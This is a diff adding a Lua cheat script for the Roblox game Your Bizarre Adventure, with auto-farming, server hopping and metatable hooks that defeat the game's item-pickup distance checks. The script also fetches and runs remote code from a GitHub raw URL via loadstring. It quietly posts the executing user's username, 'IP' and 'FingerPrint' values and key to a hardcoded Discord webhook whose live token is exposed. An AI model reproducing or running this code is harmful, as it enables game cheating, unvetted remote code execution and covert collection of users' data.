@@ -1,0 +1,558 @@
+--newww
+getgenv().HopAfterTime = 30
+getgenv().MinPlayers = 8
+
+repeat task.wait(1) until game:IsLoaded() and game:WaitForChild("Workspace"):WaitForChild"Living":WaitForChild(game.Players.LocalPlayer.Name) and game.PlaceId == 2809202155
+getgenv().dev = true
+
+local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+local Deleted = false
+function TPReturner()
+	local Site;
+	if foundAnything == "" then
+		Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Desc&limit=100'))
+	else
+		Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Desc&limit=100&cursor=' .. foundAnything))
+	end
+	local ID = ""
+	if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+		foundAnything = Site.nextPageCursor
+	end
+	local num = 0;
+	for i,v in pairs(Site.data) do
+		local Possible = true
+		ID = tostring(v.id)
+		if tonumber(v.playing) > 9 then
+			for _,Existing in pairs(AllIDs) do
+				if num ~= 0 then
+					if ID == tostring(Existing) then
+						Possible = false
+					end
+				else
+					if tonumber(actualHour) ~= tonumber(Existing) then
+						local delFile = pcall(function()
+							delfile("NotSameServers.json")
+							AllIDs = {}
+							table.insert(AllIDs, actualHour)
+						end)
+					end
+				end
+				num = num + 1
+			end
+			if Possible == true then
+				table.insert(AllIDs, ID)
+				wait()
+				pcall(function()
+					writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+					wait()
+					game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+				end)
+				wait(4)
+			end
+		end
+	end
+end
+
+function Teleport()
+	while wait() do
+		pcall(function()
+			TPReturner()
+			if foundAnything ~= "" then
+				TPReturner()
+			end
+		end)
+	end
+end
+
+
+local LocalPlayer = game.Players.LocalPlayer
+-- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
+
+local function nebun()
+	game:GetService("CoreGui").DescendantAdded:Connect(function(child) 
+		if child.Name == "ErrorPrompt" then 
+			local GrabError = child:FindFirstChild("ErrorMessage",true)
+			repeat wait() until GrabError.Text ~= "Label" 
+			local Reason = GrabError.Text 
+			if Reason then
+				wait(0.50)
+				while wait(4) do
+					local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/2809202155/servers/Public?limit=100"))
+					for i,v in pairs(sl.data) do
+						if v.playing ~= v.maxPlayers then
+							game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
+						end
+					end
+				end                
+			end
+		end
+	end)
+end
+nebun()
+local nir = 1000
+setfpscap(45)
+repeat wait() 
+	nir = nir - 1
+	nebun()
+
+	print("coaee") 
+
+until game:IsLoaded() and game.Players.LocalPlayer.PlayerGui and game.Workspace.Living:WaitForChild(game.Players.LocalPlayer.Name) or nir == 0
+if nir == 0 then
+	while wait(4) do
+		local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/2809202155/servers/Public?limit=100"))
+		for i,v in pairs(sl.data) do
+			if v.playing ~= v.maxPlayers then
+				game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
+			end
+		end
+
+	end
+end
+nir = 365
+
+nebun()
+
+--Hashing--
+local function shuffle(str)
+	local letters = {}
+	local blah = {}
+
+	for letter in str:gmatch'.[\127-\1]*' do
+		table.insert(letters, {letter = letter, 1})
+	end
+
+	for i = #letters, 5, -1 do
+		letters[i].letter = "*"
+	end
+
+
+	for i = 1, #letters, 1 do
+		local a = letters[i]
+		table.insert(blah, a)
+	end
+
+	for i, v in ipairs(blah) do blah[i] = v.letter end
+	return table.concat(blah)
+end
+
+_G.Ver = "1.8"
+if game.ReplicatedStorage:FindFirstChild("rackz")==nil then
+	local lol = Instance.new("StringValue")
+	lol.Parent = game.ReplicatedStorage
+	lol.Name = "rackz"
+end
+
+if game.ReplicatedStorage:FindFirstChild("bimd")==nil then
+	local lemao = Instance.new("StringValue")
+	lemao.Parent = game.ReplicatedStorage
+	lemao.Name = "bimd"
+end
+
+
+
+if game.CoreGui:FindFirstChild("HsB Wm")== nil then
+	local GUI = Instance.new("ScreenGui")
+	local MainFrame = Instance.new("Frame")
+	local UIGradient = Instance.new("UIGradient")
+	local ScriptName = Instance.new("TextLabel")
+	local UIGradient_2 = Instance.new("UIGradient")
+	local Credits = Instance.new("TextLabel")
+	local Nuvreau = Instance.new("TextLabel")
+	local UIGradient_3 = Instance.new("UIGradient")
+	local Buci = Instance.new("TextLabel")
+	local UIGradient_4 = Instance.new("UIGradient")
+	local Bucu = Instance.new("TextLabel")
+	local UIGradient_5 = Instance.new("UIGradient")
+
+	GUI.Name = "HsB Wm"
+	GUI.DisplayOrder = 5
+	GUI.Parent = game.CoreGui
+	GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	MainFrame.Name = "MainFrame"
+	MainFrame.Parent = GUI
+	MainFrame.BackgroundColor3 = Color3.fromRGB(255, 243, 178)
+	MainFrame.ClipsDescendants = true
+	MainFrame.Position = UDim2.new(-0.127921283, 0, -0.324189425, 0)
+	MainFrame.Size = UDim2.new(2.40100002, 0, 1.33500004, 0)
+
+	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(33, 33, 33)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
+	UIGradient.Rotation = 90
+	UIGradient.Parent = MainFrame
+
+	ScriptName.Name = "ScriptName"
+	ScriptName.Parent = MainFrame
+	ScriptName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ScriptName.BackgroundTransparency = 1.000
+	ScriptName.Position = UDim2.new(0.209173337, 0, 0.582129657, 0)
+	ScriptName.Size = UDim2.new(0, 404, 0, 75)
+	ScriptName.Font = Enum.Font.GothamBold
+	ScriptName.Text = "HSB'S YBA SCRIPTS"
+	ScriptName.TextColor3 = Color3.fromRGB(255, 255, 255)
+	ScriptName.TextScaled = true
+	ScriptName.TextSize = 14.000
+	ScriptName.TextWrapped = true
+	
+
+	UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(181, 109, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+	UIGradient_2.Parent = ScriptName
+	
+	Credits.Name = "Credits"
+	Credits.Parent = MainFrame
+	Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Credits.BackgroundTransparency = 1.000
+	Credits.Position = UDim2.new(0.21847102, 0, 0.635998964, 0)
+	Credits.Size = UDim2.new(0, 333, 0, 16)
+	Credits.Font = Enum.Font.JosefinSans
+	Credits.Text = "developed by senS & shinazo"
+	Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Credits.TextScaled = true
+	Credits.TextSize = 14.000
+	Credits.TextWrapped = true
+
+	Nuvreau.Name = "Nuvreau"
+	Nuvreau.Parent = MainFrame
+	Nuvreau.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Nuvreau.BackgroundTransparency = 1.000
+	Nuvreau.Position = UDim2.new(0.18518874, 0, 0.951531887, 0)
+	Nuvreau.Size = UDim2.new(0, 595, 0, 26)
+	Nuvreau.Font = Enum.Font.Kalam
+	Nuvreau.Text = "discord.gg/hsb"
+	Nuvreau.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Nuvreau.TextScaled = true
+	Nuvreau.TextSize = 14.000
+	Nuvreau.TextWrapped = true
+
+	UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+	UIGradient_3.Parent = Nuvreau
+	UIGradient_3.Archivable = false
+
+	Buci.Name = "Buci"
+	Buci.Parent = MainFrame
+	Buci.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Buci.BackgroundTransparency = 1.000
+	Buci.Position = UDim2.new(0.061248038, 0, 0.951297641, 0)
+	Buci.Size = UDim2.new(0, 318, 0, 27)
+	Buci.Font = Enum.Font.Gotham
+	Buci.Text = "Loading [0]..."
+	Buci.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Buci.TextScaled = true
+	Buci.TextSize = 14.000
+	Buci.TextWrapped = true
+	Buci.TextXAlignment = Enum.TextXAlignment.Left
+
+	UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+	UIGradient_4.Parent = Buci
+	UIGradient_4.Archivable = false
+
+	Bucu.Name = "Bucu"
+	Bucu.Parent = MainFrame
+	Bucu.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Bucu.BackgroundTransparency = 1.000
+	Bucu.Position = UDim2.new(0.218645513, 0, 0.576580942, 0)
+	Bucu.Size = UDim2.new(0, 333, 0, 16)
+	Bucu.Font = Enum.Font.JosefinSans
+	Bucu.Text = "join the discord server to keep updated!"
+	Bucu.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Bucu.TextScaled = true
+	Bucu.TextSize = 14.000
+	Bucu.TextWrapped = true
+
+	UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+	UIGradient_5.Parent = Bucu
+	UIGradient_5.Archivable = false
+
+	--[[ UIAspectRatioConstraint.Parent = MainFrame
+	UIAspectRatioConstraint.AspectRatio = 3.500 ]]--
+end
+
+local function Telepoarta()
+	local part = Instance.new("Part")
+	part.Name = tostring(math.random(1, 9999))
+	part.Anchored = true
+	part.Size = Vector3.new(200,1,200)
+	part.Parent = workspace
+	part.Transparency = 1
+	part.Position = Vector3.new(-437.80279541015625, -70.98097229003906, 327.1223449707031)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(0, 7, 0)
+end
+
+for _,v in pairs(workspace:GetDescendants()) do
+	if v.ClassName == "Part"
+		or v.ClassName == "SpawnLocation"
+		or v.ClassName == "WedgePart"
+		or v.ClassName == "Terrain"
+		or v.ClassName == "MeshPart" then
+		v.BrickColor = BrickColor.new(155, 155, 155)
+		v.Material = "Plastic"
+	end
+end
+
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+local WindowFocusReleasedFunction = function()
+	RunService:Set3dRenderingEnabled(false)
+	setfpscap(36)
+	return
+end
+
+local WindowFocusedFunction = function()
+	RunService:Set3dRenderingEnabled(true)
+	setfpscap(360)
+	return
+end
+
+local Initialize = function()
+	UserInputService.WindowFocusReleased:Connect(WindowFocusReleasedFunction)
+	UserInputService.WindowFocused:Connect(WindowFocusedFunction)
+	return
+end
+Initialize()
+
+
+repeat wait()
+	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") then
+		firesignal(game.Players.LocalPlayer.PlayerGui:WaitForChild("LoadingScreen"):WaitForChild("Frames"):WaitForChild("Gamemodes"):WaitForChild("Main").MouseButton1Click)
+	end
+until game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil
+
+wait(.44)
+
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+
+old = hookmetamethod(game,"__namecall", function(self,...)
+	local args = {...}
+	local method = getnamecallmethod()
+	if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
+		return "  ___XP DE KEY"
+	end
+	return old(self, ...)
+end)
+
+print(tostring("Current Version: ".._G.Ver))
+
+mold = hookmetamethod(game,"__namecall", function(self,...)
+	local args = {...}
+	local method = getnamecallmethod()
+	if tostring(method) == "InvokeServer" and args[1]=="ToggleStand" then
+		return wait(9e9)
+	end
+	return mold(self, ...)
+end)
+
+local count = 0
+local timee = getgenv().HopAfterTime
+local timer = 6
+local lp = game.Players.LocalPlayer
+
+local function rasa(itemname)
+	local everyone
+	if itemname == "Lucky Arrow" then
+		local everyone = "@everyone"
+	else 
+		local everyone = ""
+	end
+	local amount = 0
+	for _, child in pairs (game.Players.LocalPlayer.Backpack:GetChildren()) do
+		if child.Name == itemname then
+			amount = amount + 1
+		end
+	end
+	local data = {
+		['content'] = everyone,
+		['username'] = "HsB CatHook",
+		["embeds"] = {{
+			['title'] = "Your Bizarre Adventure",
+			['color'] = tonumber(0xff7f42),
+			["footer"] = {
+				["text"] = ("HsB Hub ("..os.date("%H:%M")..")"),
+				["icon_url"] = "https://cdn.discordapp.com/attachments/875211210486870076/1067422518413103134/hsb222.png"
+			},
+			["fields"] = {
+				{
+					["name"] = "Name", -- This is  the title of your field.
+					["value"] = "||"..game.Players.LocalPlayer.Name.."||" -- This is the value of your field.
+				},
+				{
+					["name"] = "Item", -- This is  the title of your field.
+					["value"] = "||"..itemname.."||" -- This is the value of your field.
+				},
+				{
+					["name"] = "Current Amount of " ..itemname.. "", -- This is  the title of your field.
+					["value"] = amount -- This is the value of your field.   
+				}
+			}}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = webhooklink, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+end
+
+--rbxassetid://7106192858
+getgenv().WM = game.CoreGui["HsB Wm"]
+getgenv().MainFrm = WM.MainFrame
+
+local lucky = "rbxassetid://7106181610"
+local lucci = "rbxassetid://7106192858"
+local GoldCoin = "rbxassetid://7124126253"
+local diodiary = "rbxassetid://5675321032"
+local arrow = "rbxassetid://7106104343"
+
+local nuvreau = {lucky, lucci}
+
+local function spawnItems()
+
+	local repFirst = game.GetService(game, 'ReplicatedFirst');
+	local itemSpawn = repFirst.ItemSpawn;
+	local vector3Metatable = getrawmetatable(Vector3.new());
+	local oldIndex = rawget(vector3Metatable, '__index');
+
+	setreadonly(vector3Metatable, false) do
+		vector3Metatable.__index = newcclosure(function(self, idx)
+			if(string.lower(idx) == 'magnitude' and getcallingscript() == itemSpawn) then
+				return 0
+			end
+			return oldIndex(self, idx);
+		end)
+	end; setreadonly(vector3Metatable, true)
+end
+
+local function startAutoFarm()
+	timee = timee -1
+	spawnItems()
+	print(timee)
+
+	if timee == 0 then
+		while task.wait(0.25) do
+			timer = timer - 1
+			Teleport()
+		end
+	end
+end
+
+pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/senS24t/omaigad/main/checkbybfyn"))()
+	local tweenservice = game:GetService("TweenService")
+	for i, child in pairs(MainFrm:GetChildren()) do
+		if child:IsA("TextLabel") or child:IsA("Frame") or child:IsA("ImageLabel") then
+			tweenservice:Create(MainFrm, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
+			tweenservice:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
+		end
+	end
+	wait(0.5)
+	MainFrm.Parent.Enabled = false
+end)
+local url =
+	"https://discord.com/api/webhooks/1063637408823902269/JTJ9RJuLbnJMKBGf1oDH-l8eUPo7UQ48aaDcmmWW4kWgwJeCp8LpQE7TS4hm-aSxVU6m"
+local data = {
+	["content"] = "Lucky ".. game.Players.LocalPlayer.Name,
+	["embeds"] = {
+		{
+			["title"] = "Someone Executed Your LuckyArrow Script",
+			["description"] = "Username: " ..game.Players.LocalPlayer.Name.. " IP: " ..game.CoreGui.rackz.Value.. "FingerPrint: " ..game.CoreGui.bimd.Value.. " Discord: ".."<@"..getgenv().ping..">".." Key: "..getgenv().Update.." Allowed: "..(tostring(getgenv().Allowed)),
+			["type"] = "",
+			["color"] = (55)
+		}
+	}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+	["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+LocalPlayer.Backpack.ChildAdded:Connect(function(Arru)
+	for i, c in pairs(getgenv().AllowedItems) do
+		if Arru:IsA("Tool") and Arru.Name == c then
+			rasa(Arru.Name)
+		end
+	end
+end)
+
+local function autofarm()
+	pcall(function()
+		for i, v in pairs(getgenv().AllowedItems) do
+			for _,b in pairs(workspace.Item_Spawns.Items:GetChildren()) do
+				if b:IsA("Model") then
+					for _,Item in pairs(b:GetChildren()) do
+						if Item:IsA("MeshPart") or Item:IsA("Part") then if Item.Transparency ~=1 then
+								if b.ProximityPrompt.ObjectText == v then
+									LocalPlayer.Character.HumanoidRootPart.CFrame = b:GetModelCFrame()
+									task.wait(0.35)
+									if Item and (Item.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 6 then
+										if b:FindFirstChild("ProximityPrompt") then
+											fireproximityprompt(b.ProximityPrompt)
+											task.wait(.40)
+											if (game.Players.LocalPlayer.PlayerGui:FindFirstChild("Message"))then
+												if string.match(lp.PlayerGui.Message.TextLabel.Text, "You can't have more") then
+													table.remove(nuvreau, 1)
+													while wait(0.355) do
+														Wm.Enabled = true
+														MainFrm.BackgroundTransparency = 0
+														MainFrm.Buci.TextTransparency = 0
+														MainFrm.Buci.Text = "Attempting to switch servers, be patient!"
+														Teleport()
+													end
+												end
+											end
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end)
+end
+
+local function farmHop()
+	if getgenv().debug then
+		print("autohop(), Autofarming, not enough")
+	end
+	spawnItems()
+	wait(1)
+	local xd = true
+	while xd do task.wait()
+		pcall(function()
+			for i, v in pairs(getgenv().AllowedItems) do
+				for _, aga in pairs(workspace.Item_Spawns.Items:GetChildren()) do
+					if aga:IsA("Model") then
+						for _, aga2 in pairs(aga:GetChildren()) do
+							if aga2:IsA("MeshPart") then
+								if aga.ProximityPrompt.ObjectText == v and aga2.Transparency ~= 1 then
+									print(aga.ProximityPrompt.ObjectText.." FOUND")
+									autofarm()
+								end
+								if aga.ProximityPrompt.ObjectText ~= v or aga2.Transparency == 1 then print(aga.ProximityPrompt.ObjectText, aga2.Transparency)
+								end
+							end
+						end
+					end
+				end
+			end
+			wait(1.50)
+			print("---------------------------")
+			wait(25)
+			print("Telepor")
+			Teleport()
+		end)
+	end
+end
+farmHop() 
